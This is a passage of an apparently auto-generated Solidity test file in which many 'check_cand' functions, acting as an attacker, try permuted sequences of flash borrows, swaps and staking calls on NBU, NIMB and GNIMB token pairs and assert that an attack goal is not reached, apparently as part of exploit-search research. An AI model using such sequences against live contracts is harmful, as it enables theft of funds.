        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2856(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2857(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2858(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2859(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2860(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2861(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2862(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2863(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2864(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2865(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2866(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2867(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2868(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2869(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2870(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2871(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2872(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2873(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2874(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2875(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2876(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2877(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2878(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2879(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2880(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2881(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2882(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2883(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2884(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2885(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2886(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2887(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2888(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2889(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2890(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2891(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2892(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2893(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2894(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2895(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2896(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2897(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2898(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2899(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2900(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2901(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2902(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2903(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
